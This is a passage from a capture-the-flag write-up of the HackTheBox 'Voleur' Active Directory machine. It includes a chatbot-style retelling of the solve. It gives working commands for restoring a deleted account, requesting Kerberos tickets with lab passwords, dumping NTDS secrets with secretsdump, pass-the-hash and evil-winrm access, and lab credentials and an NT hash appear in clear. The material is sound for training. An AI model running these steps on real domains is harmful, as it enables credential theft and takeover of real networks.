&quot;user&quot;' -IncludeDeletedObjects
-Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID,
objectSid, lastKnownParent | Format-List
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210639-bs9qdbs" data-type="NodeParagraph" class="p" updated="20250706210639" id="20250706210639-bs9qdbs"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210703-8cgyy66" data-type="NodeParagraph" class="p" id="20250706210703-8cgyy66" updated="20250706210814"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706210814-re4s4wh.png" data-src="assets/image-20250706210814-re4s4wh.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210815-3cwxww1" data-type="NodeCodeBlock" class="code-block" updated="20250706210827" id="20250706210815-3cwxww1"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210828-jnufajg" data-type="NodeParagraph" class="p" id="20250706210828-jnufajg" updated="20250706210828"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210937-drs41mf" data-type="NodeParagraph" class="p" id="20250706210937-drs41mf" updated="20250706210955"><div contenteditable="false" spellcheck="false">now we restore <span data-type="code">todd.wolfe</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210959-3w6fz9k" data-type="NodeCodeBlock" class="code-block" id="20250706210959-3w6fz9k" updated="20250706211001"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706211003-f4v6zs4" data-type="NodeParagraph" class="p" id="20250706211003-f4v6zs4" updated="20250706211003"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706211005-33sx979" data-type="NodeParagraph" class="p" id="20250706211005-33sx979" updated="20250706211048"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706211048-1apfeyd.png" data-src="assets/image-20250706211048-1apfeyd.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706211049-wir5v5a" data-type="NodeParagraph" class="p" id="20250706211049-wir5v5a" updated="20250706211049"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706212743-mdh0e1l" data-type="NodeParagraph" class="p" id="20250706212743-mdh0e1l" updated="20250706212757"><div contenteditable="false" spellcheck="false">Genrated TGT of <span data-type="code">todd.wolfe</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706212759-pwg8i38" data-type="NodeCodeBlock" class="code-block" id="20250706212759-pwg8i38" updated="20250706212804"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">impacket-getTGT voleur.htb/todd.wolfe:'NightT1meP1dg3on14' -dc-ip DC.VOLEUR.HTB
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706212805-te160wq" data-type="NodeParagraph" class="p" id="20250706212805-te160wq" updated="20250706212805"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221228-4z6ppae" data-type="NodeCodeBlock" class="code-block" id="20250706221228-4z6ppae" updated="20250706221234"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">cred</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">Username : jeremy.combs
Unknown : qT3V9pLXyN7W4m
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221230-x6ndn80" data-type="NodeParagraph" class="p" id="20250706221230-x6ndn80" updated="20250706221230"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221736-w87axtm" data-type="NodeParagraph" class="p" id="20250706221736-w87axtm" updated="20250706221736"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221736-4e72psc" data-type="NodeCodeBlock" class="code-block" id="20250706221736-4e72psc" updated="20250706221745"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">impacket-getTGT VOLEUR.HTB/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip DC.VOLEUR.HTB
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221746-3uqvv3h" data-type="NodeCodeBlock" class="code-block" updated="20250706221753" id="20250706221746-3uqvv3h"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">export KRB5CCNAME=jeremy.combs.ccache
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221756-o72xbh6" data-type="NodeParagraph" class="p" updated="20250706221756" id="20250706221756-o72xbh6"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221757-qcwqxo4" data-type="NodeCodeBlock" class="code-block" updated="20250706221905" id="20250706221757-qcwqxo4"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">KRB5CCNAME=jeremy.combs.ccache smbclient.py -k DC.VOLEUR.HTB
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221757-z3yu1q7" data-type="NodeParagraph" class="p" id="20250706221757-z3yu1q7" updated="20250706221757"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221907-ep4epp4" data-type="NodeCodeBlock" class="code-block" id="20250706221907-ep4epp4" updated="20250706221917"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false"># use IT
# ls
drw-rw-rw-          0  Wed Jan 29 14:40:01 2025 .
drw-rw-rw-          0  Tue Jul  1 02:38:33 2025 ..
drw-rw-rw-          0  Thu Jan 30 21:41:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 21:41:29 2025 .
drw-rw-rw-          0  Wed Jan 29 14:40:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 21:41:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 21:37:35 2025 Note.txt.txt
# mget id_rsa
[*] Downloading id_rsa
# mget Note.txt.txt
[*] Downloading Note.txt.txt
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221918-9gkn7e1" data-type="NodeParagraph" class="p" id="20250706221918-9gkn7e1" updated="20250706221918"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221948-ds2cfal" data-type="NodeParagraph" class="p" id="20250706221948-ds2cfal" updated="20250706221948"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221948-pl5jjwr" data-type="NodeParagraph" class="p" id="20250706221948-pl5jjwr" updated="20250706221948"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span style="width: 1265px;"><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706221948-8gfazgf.png" data-src="assets/image-20250706221948-8gfazgf.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706221951-s7q1m0b" data-type="NodeParagraph" class="p" id="20250706221951-s7q1m0b" updated="20250706221951"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222016-4kd8ugf" data-type="NodeParagraph" class="p" id="20250706222016-4kd8ugf" updated="20250706222035"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706222035-sgb5idf.png" data-src="assets/image-20250706222035-sgb5idf.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222018-fyj9c50" data-type="NodeCodeBlock" class="code-block" id="20250706222018-fyj9c50" updated="20250706222112"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">ssh svc_backup@voleur.htb -p 2222 -i id_rsa
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222113-4bmb4z6" data-type="NodeParagraph" class="p" updated="20250706222129" id="20250706222113-4bmb4z6"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span style="width: 894px;"><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706222129-8vskeey.png" data-src="assets/image-20250706222129-8vskeey.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222133-m3bz74x" data-type="NodeParagraph" class="p" id="20250706222133-m3bz74x" updated="20250706222133"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222526-0hpqabm" data-type="NodeCodeBlock" class="code-block" id="20250706222526-0hpqabm" updated="20250706222527"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">scp -P 2222 -i id_rsa &quot;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*&quot; ./ &amp;&amp; \
scp -P 2222 -i id_rsa &quot;svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/*&quot; ./
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706222528-jvpupoj" data-type="NodeParagraph" class="p" id="20250706222528-jvpupoj" updated="20250706223614"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706223614-xtagoyr.png" data-src="assets/image-20250706223614-xtagoyr.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223614-7oos9e1" data-type="NodeParagraph" class="p" id="20250706223614-7oos9e1" updated="20250706223614"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223618-7nj3wa2" data-type="NodeCodeBlock" class="code-block" updated="20250706223634" id="20250706223618-7nj3wa2"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223635-s2i6qq9" data-type="NodeParagraph" class="p" id="20250706223635-s2i6qq9" updated="20250706223635"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223635-l0p784l" data-type="NodeParagraph" class="p" updated="20250706223713" id="20250706223635-l0p784l"><div contenteditable="false" spellcheck="false">Secret Dumped :) </div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223635-7ichzj0" data-type="NodeParagraph" class="p" id="20250706223635-7ichzj0" updated="20250706223707"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706223707-rphnmnb.png" data-src="assets/image-20250706223707-rphnmnb.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223708-hggqiiv" data-type="NodeBlockquote" class="bq" id="20250706223708-hggqiiv" updated="20250706223723"><div data-node-id="20250706223723-p4m052e" data-type="NodeParagraph" class="p" id="20250706223723-p4m052e" updated="20250706223723"><div contenteditable="false" spellcheck="false">e656e07c56d831611b577b160b259ad2</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223724-u0q6zyn" data-type="NodeParagraph" class="p" id="20250706223724-u0q6zyn" updated="20250706223724"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223956-ax1pt8u" data-type="NodeCodeBlock" class="code-block" id="20250706223956-ax1pt8u" updated="20250706224007"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76

export KRB5CCNAME=administrator.ccache
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706223958-6gangl8" data-type="NodeParagraph" class="p" id="20250706223958-6gangl8" updated="20250706223958"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706224009-dwgabny" data-type="NodeParagraph" class="p" id="20250706224009-dwgabny" updated="20250706224009"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706224117-oidf5tb" data-type="NodeCodeBlock" class="code-block" id="20250706224117-oidf5tb" updated="20250706224118"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706224107-zm3fah4" data-type="NodeParagraph" class="p" id="20250706224107-zm3fah4" updated="20250706224107"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706224132-2x89yxe" data-type="NodeParagraph" class="p" id="20250706224132-2x89yxe" updated="20250706224132"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706224132-hu2pt26.png" data-src="assets/image-20250706224132-hu2pt26.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h1" data-node-id="20250706205901-iph0es4" data-type="NodeHeading" class="h1" id="20250706205901-iph0es4"><div contenteditable="false" spellcheck="false">Untitled</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-3gf2grw" data-type="NodeParagraph" class="p" id="20250706205901-3gf2grw" updated="20250706205901"><div contenteditable="false" spellcheck="false">Of course! Here’s a breakdown of the Voleur box, written as if one hacker were explaining it to another.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-kp2rkpz" data-type="NodeThematicBreak" class="hr" id="20250706205901-kp2rkpz" updated="20250706205901"><div></div></div><div data-node-id="20250706205901-j0yv0t4" data-type="NodeParagraph" class="p" id="20250706205901-j0yv0t4" updated="20250706205901"><div contenteditable="false" spellcheck="false">Alright, let's walk through how this Voleur box was taken down. It was a pretty cool journey, starting with just a single set of credentials and peeling back the layers one by one.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-ssyebnh" data-type="NodeHeading" class="h3" id="20250706205901-ssyebnh" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 1: Casing the Joint (Reconnaissance)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-omaz1d6" data-type="NodeParagraph" class="p" id="20250706205901-omaz1d6" updated="20250706205901"><div contenteditable="false" spellcheck="false">First things first, you gotta know what you're dealing with. We ran a quick but deep <span data-type="code">nmap</span>​ scan to see what doors were open on the machine.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-foyq7tk" data-type="NodeCodeBlock" class="code-block" id="20250706205901-foyq7tk" updated="20250706205901"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">bash</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">nmap -sCV -p- 10.10.11.76 ...
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-6ek1t58" data-type="NodeParagraph" class="p" id="20250706205901-6ek1t58" updated="20250706205901"><div contenteditable="false" spellcheck="false">The results basically screamed &quot;Domain Controller!&quot; We saw all the usual suspects: DNS (port 53), Kerberos (port 88), SMB (port 445), and LDAP (port 389). This confirmed we were up against a full-blown Active Directory environment.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-5u7jcbh" data-type="NodeParagraph" class="p" id="20250706205901-5u7jcbh" updated="20250706205901"><div contenteditable="false" spellcheck="false">Two things stood out, though:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="o" data-node-id="20250706205901-7ii61m3" data-type="NodeList" class="list" id="20250706205901-7ii61m3" updated="20250706205901"><div data-marker="1." data-subtype="o" data-node-id="20250706205901-0zbih4c" data-type="NodeListItem" class="li" id="20250706205901-0zbih4c" updated="20250706205901"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">1.</div><div data-node-id="20250706205901-mu941bi" data-type="NodeParagraph" class="p" id="20250706205901-mu941bi" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Port 2222 was open with SSH.</span> This is a bit unusual for a Windows DC and hinted that maybe Windows Subsystem for Linux (WSL) was set up. We filed that away for later.</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-marker="2." data-subtype="o" data-node-id="20250706205901-55w00vx" data-type="NodeListItem" class="li" id="20250706205901-55w00vx" updated="20250706205901"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">2.</div><div data-node-id="20250706205901-nlki0rf" data-type="NodeParagraph" class="p" updated="20250706205901" id="20250706205901-nlki0rf"><div contenteditable="false" spellcheck="false"><span data-type="strong">Port 5985 was open for WinRM.</span> This is our go-to for getting a remote shell if we can get credentials.</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-tlob8i7" data-type="NodeHeading" class="h3" id="20250706205901-tlob8i7" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 2: Finding the First Weak Link (Kerberoasting)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-wk6ujdv" data-type="NodeParagraph" class="p" id="20250706205901-wk6ujdv" updated="20250706205901"><div contenteditable="false" spellcheck="false">Since we were in an &quot;Assumed Breach&quot; scenario, we started with a user's credentials (<span data-type="code">ryan.naylor</span>​). The first thing to do in any AD environment is to map it out. We used <span data-type="code">BloodHound</span>​ for this.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-538meik" data-type="NodeCodeBlock" class="code-block" id="20250706205901-538meik" updated="20250706205901"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">bash</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">bloodhound-python -u ryan.naylor -p 'Hollow0ct31Nyt' ...
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-vaheqqq" data-type="NodeParagraph" class="p" id="20250706205901-vaheqqq" updated="20250706205901"><div contenteditable="false" spellcheck="false">BloodHound drew us a beautiful map of the domain, and sure enough, it pointed out a classic weak spot: a &quot;kerberoastable&quot; user named <span data-type="code">svc_ldap</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-97ai7fd" data-type="NodeParagraph" class="p" id="20250706205901-97ai7fd" updated="20250706205901"><div contenteditable="false" spellcheck="false">In simple terms, this means we could ask the domain for a special ticket for that service account. The ticket is encrypted with the account's own password hash. We can take that ticket offline and try to crack the password without ever alerting the system.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-dspyi96" data-type="NodeParagraph" class="p" id="20250706205901-dspyi96" updated="20250706205901"><div contenteditable="false" spellcheck="false">So, we did just that with <span data-type="code">targetedKerberoast.py</span>​ and got the hash for another user, <span data-type="code">svc_winrm</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-lbzo0o3" data-type="NodeHeading" class="h3" id="20250706205901-lbzo0o3" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 3: Cracking the Password and Getting In</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-c2mig62" data-type="NodeParagraph" class="p" id="20250706205901-c2mig62" updated="20250706205901"><div contenteditable="false" spellcheck="false">We took that hash, threw a big list of common passwords (<span data-type="code">rockyou.txt</span>​) at it using <span data-type="code">john</span>​, and... <span data-type="strong">bingo!</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-b2jardn" data-type="NodeParagraph" class="p" id="20250706205901-b2jardn" updated="20250706205901"><div contenteditable="false" spellcheck="false">We got the password for <span data-type="code">svc_winrm</span>​: <span data-type="code">AFireInsidedeOzarctica980219afi</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-rvgvsb1" data-type="NodeParagraph" class="p" updated="20250706205901" id="20250706205901-rvgvsb1"><div contenteditable="false" spellcheck="false">Now we had the keys to the kingdom... or at least, a room inside. We used <span data-type="code">evil-winrm</span>​ with these new credentials to get our first interactive shell on the machine. We were in!</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-6qu19cb" data-type="NodeHeading" class="h3" id="20250706205901-6qu19cb" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 4: The Ghost in the Machine (Pivoting)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-3yogckr" data-type="NodeParagraph" class="p" id="20250706205901-3yogckr" updated="20250706205901"><div contenteditable="false" spellcheck="false">This next part was pretty slick. Inside the network, we found another set of credentials for <span data-type="code">svc_ldap</span>​. Using that user's access, we started poking around and found a &quot;ghost&quot; in the system—a deleted user account named <span data-type="code">todd.wolfe</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-5dnb586" data-type="NodeParagraph" class="p" id="20250706205901-5dnb586" updated="20250706205901"><div contenteditable="false" spellcheck="false">Why is that interesting? Because sometimes, when you restore a deleted user in Active Directory, it comes back with its old group memberships and, crucially, its old password hash still works!</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-04mwvgl" data-type="NodeParagraph" class="p" id="20250706205901-04mwvgl" updated="20250706205901"><div contenteditable="false" spellcheck="false">So we resurrected the <span data-type="code">todd.wolfe</span>​ account. We guessed his old password (a common one, <span data-type="code">NightT1meP1dg3on14</span>​) and, what do you know, it worked! This gave us yet another user to play with.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-7tr15sm" data-type="NodeHeading" class="h3" id="20250706205901-7tr15sm" updated="20250706205901"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 5: The Golden Ticket (Finding the SSH Key)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-bh21or3" data-type="NodeParagraph" class="p" id="20250706205901-bh21or3" updated="20250706205901"><div contenteditable="false" spellcheck="false">Pivoting through these accounts, we eventually got access as <span data-type="code">jeremy.combs</span>​ and started looking through the file shares. In the <span data-type="code">IT</span>​ share, we hit a mini-jackpot:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="u" data-node-id="20250706205901-wn3se57" data-type="NodeList" class="list" id="20250706205901-wn3se57" updated="20250706205901"><div data-marker="*" data-subtype="u" data-node-id="20250706205901-5jwljr9" data-type="NodeListItem" class="li" updated="20250706205901" id="20250706205901-5jwljr9"><div class="protyle-action" draggable="true"><svg><use xlink:href="#iconDot"></use></svg></div><div data-node-id="20250706205901-vp4xkgh" data-type="NodeParagraph" class="p" id="20250706205901-vp4xkgh" updated="20250706205901"><div contenteditable="false" spellcheck="false">A file named <span data-type="code">Note.txt.txt</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-marker="*" data-subtype="u" data-node-id="20250706205901-xfd8krv" data-type="NodeListItem" class="li" id="20250706205901-xfd8krv" updated="20250706205901"><div class="protyle-action" draggable="true"><svg><use xlink:href="#iconDot"></use></svg></div><div data-node-id="20250706205901-smkm9e6" data-type="NodeParagraph" class="p" id="20250706205901-smkm9e6" updated="20250706205901"><div contenteditable="false" spellcheck="false">An SSH private key file named <span data-type="code">id_rsa</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205901-vfvd7yv" data-type="NodeParagraph" class="p" id="20250706205901-vfvd7yv" updated="20250706205901"><div contenteditable="false" spellcheck="false">The note from the 'Admin' basically said, &quot;Hey, I'm setting up Linux for our backups.&quot; This was a massive clue. The SSH key almost certainly belonged to a backup service account. Putting two and two together, we guessed the username was <span data-type="code">svc_backup</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205901-knm1lv9" data-type="NodeHeading" 